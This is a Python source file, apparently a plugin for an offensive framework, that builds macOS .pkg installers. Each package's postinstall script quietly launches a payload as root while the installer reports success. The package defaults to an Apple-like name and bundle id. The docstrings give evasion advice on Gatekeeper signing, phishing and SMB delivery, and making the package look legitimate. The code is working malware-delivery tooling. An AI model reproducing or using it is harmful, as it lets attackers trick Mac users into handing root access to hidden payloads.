"""
Erebus Plugin - macOS PKG Installer Trigger
Author: Whispergate
Description: Creates macOS PKG installer structures that execute payload via postinstall scripts.

Execution path:
  .pkg  → double-click → macOS Installer.app → postinstall script runs as root

PKG installers are the standard macOS software distribution format.  A postinstall
script embedded inside the package runs as root after the payload files are
extracted.  If `pkgbuild` is available on the build host the plugin produces a
real signed-ready .pkg file; if not it emits the raw script + PackageInfo XML so
the operator can assemble or sign the package on a macOS build host.

Gatekeeper quarantines unsigned PKG files downloaded via browser, but packages
distributed via email attachment, SMB share, or phishing page with a direct
download link are less reliably checked on older macOS versions.
"""

import os
import pathlib
import shutil
import subprocess
import textwrap
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class PkgTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating macOS PKG installer triggers.

    Generates a postinstall bash script that executes the payload, plus a
    PackageInfo XML stub.  If pkgbuild is available on the build host a real .pkg
    is assembled.  Otherwise the raw artefacts are emitted for manual assembly on
    a macOS host.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="pkg_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates macOS PKG installer triggers with payload execution via postinstall script",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_pkg_trigger": self.create_pkg_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] PKG Trigger plugin loaded - Supporting macOS .pkg installer delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _pkgbuild_available() -> bool:
        return shutil.which("pkgbuild") is not None

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_pkg_trigger(
        self,
        payload_path: str,
        output_dir: str,
        payload_dir: pathlib.Path,
        pkg_name: str = "SystemUpdate.pkg",
        bundle_id: str = "com.apple.systemupdate",
        install_location: str = "/tmp",
        pkg_version: str = "1.0",
    ) -> pathlib.Path:
        """
        Create a macOS PKG installer that runs the payload via a postinstall script.

        The postinstall script:
          1. Copies the bundled payload from the installer's payload root to /tmp.
          2. Sets executable bit.
          3. Launches via nohup in the background and exits - Installer.app sees
             success and shows "Installation was successful".

        If pkgbuild is found on PATH the method assembles a real .pkg and returns
        its path.  If pkgbuild is unavailable it writes the raw scripts + metadata
        to `<output_dir>/pkg_project/` and returns that directory.

        Args:
            payload_path:      Path to the compiled payload binary (ELF/Mach-O/script).
            output_dir:        Directory where the .pkg or pkg_project/ will be written.
            payload_dir:       Payload staging directory (used to locate the binary).
            pkg_name:          Output .pkg filename.
            bundle_id:         CFBundleIdentifier for the package (reverse-DNS style).
            install_location:  Root path where payload files are installed.
            pkg_version:       Package version string shown in Installer.app.

        Returns:
            pathlib.Path: Path to the assembled .pkg (if pkgbuild available)
                          or the pkg_project/ directory (if not).

        ## OPSEC Notes
        Detection Surface:
          - Installer.app spawns postinstall as root - high-confidence alert signal
          - pkg_name and bundle_id are visible in system_profiler SPInstallHistoryDataType
            after installation
          - nohup output redirected to /dev/null; the payload process is detached
        Hardening:
          - [MALLEABLE] Sign with an Apple Developer ID Installer certificate to pass
            Gatekeeper on macOS 10.15+.  Use `productsign` post-assembly.
          - [MALLEABLE] Rename pkg_name to match a legitimate-looking update package
          - Distribute via direct download link (not App Store) to skip notarisation
            requirement on older macOS versions
        Evasion Maturity: Level 3 (Elevated) - requires root execution context;
          postinstall-as-root is a well-known malware technique (XCSSET, Silver Sparrow).
          Unsigned packages generate a Gatekeeper dialog on macOS 12+.
        """
        output_dir = pathlib.Path(output_dir)
        payload_dir = pathlib.Path(payload_dir)
        payload_path = pathlib.Path(payload_path)

        pkg_project = output_dir / "pkg_project"
        scripts_dir = pkg_project / "scripts"
        root_dir    = pkg_project / "root" / install_location.lstrip("/")
        scripts_dir.mkdir(parents=True, exist_ok=True)
        root_dir.mkdir(parents=True, exist_ok=True)

        # Copy payload into the package root so pkgbuild bundles it
        payload_basename = payload_path.name if payload_path.exists() else "payload"
        payload_dest = root_dir / payload_basename
        if payload_path.exists():
            shutil.copy2(payload_path, payload_dest)
        else:
            payload_dest.write_bytes(b"")  # placeholder for manual assembly

        # postinstall script
        postinstall_src = textwrap.dedent(f"""\
            #!/usr/bin/env bash
            _dst="{install_location}/{payload_basename}"
            chmod +x "$_dst"
            nohup "$_dst" >/dev/null 2>&1 &
            exit 0
        """)
        postinstall_path = scripts_dir / "postinstall"
        postinstall_path.write_text(postinstall_src, encoding="utf-8")
        postinstall_path.chmod(0o755)

        # PackageInfo XML stub (used by pkgbuild internally; also emitted for manual assembly)
        package_info = textwrap.dedent(f"""\
            <?xml version="1.0" encoding="utf-8"?>
            <pkg-info format-version="2"
                      identifier="{bundle_id}"
                      version="{pkg_version}"
                      install-location="{install_location}"
                      auth="root">
              <payload numberOfFiles="1"/>
              <scripts>
                <postinstall file="./postinstall"/>
              </scripts>
            </pkg-info>
        """)
        (pkg_project / "PackageInfo").write_text(package_info, encoding="utf-8")

        if self._pkgbuild_available():
            pkg_output = output_dir / pkg_name
            try:
                subprocess.run(
                    [
                        "pkgbuild",
                        "--root",      str(pkg_project / "root"),
                        "--scripts",   str(scripts_dir),
                        "--identifier", bundle_id,
                        "--version",   pkg_version,
                        "--install-location", install_location,
                        str(pkg_output),
                    ],
                    check=True,
                    capture_output=True,
                )
                print(f"[Plugin] PKG assembled via pkgbuild: {pkg_output}")
                return pkg_output
            except subprocess.CalledProcessError as exc:
                print(
                    f"[Plugin] pkgbuild failed ({exc.returncode}); "
                    f"raw project at {pkg_project}. "
                    f"stderr: {exc.stderr.decode(errors='replace')}"
                )
                return pkg_project
        else:
            print(
                f"[Plugin] pkgbuild not available on build host. "
                f"Raw PKG project emitted to {pkg_project}. "
                f"Assemble on macOS with: "
                f"pkgbuild --root pkg_project/root --scripts pkg_project/scripts "
                f"--identifier {bundle_id} --version {pkg_version} "
                f"--install-location {install_location} {pkg_name}"
            )
            return pkg_project


# Module-level instance for plugin auto-discovery
_plugin = PkgTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
